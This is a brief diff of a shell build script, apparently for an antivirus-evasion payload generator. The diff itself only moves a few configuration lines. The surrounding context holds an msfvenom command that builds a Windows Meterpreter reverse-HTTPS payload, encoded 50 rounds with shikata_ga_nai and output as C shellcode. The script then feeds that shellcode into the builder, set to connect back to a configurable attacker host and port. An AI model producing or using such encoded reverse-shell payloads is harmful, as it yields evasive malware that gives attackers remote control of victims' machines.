@@ -25,6 +25,9 @@ cat banner.txt
 # override connect-back settings here, if necessary
 LPORT=$GLOBAL_LPORT
 LHOST=$GLOBAL_LHOST
+# no command preexec
+set_command_source no_data
+set_command_exec no_command
 # enable debug output
 enable_debug_print
 #CONFIGURATION_END
@@ -32,10 +35,6 @@ enable_debug_print
 
 # make meterpreter reverse payload, encoded 50 rounds with shikata_ga_nai
 msfvenom -p windows/meterpreter/reverse_https lhost=$LHOST lport=$LPORT -e x86/shikata_ga_nai -i 50 -f c -a x86 --platform Windows > input/sc_c.txt
-
-# no command preexec
-set_command_source no_data
-set_command_exec no_command
 
 # set shellcode source
 set_payload_source static_from_file input/sc_c.txt
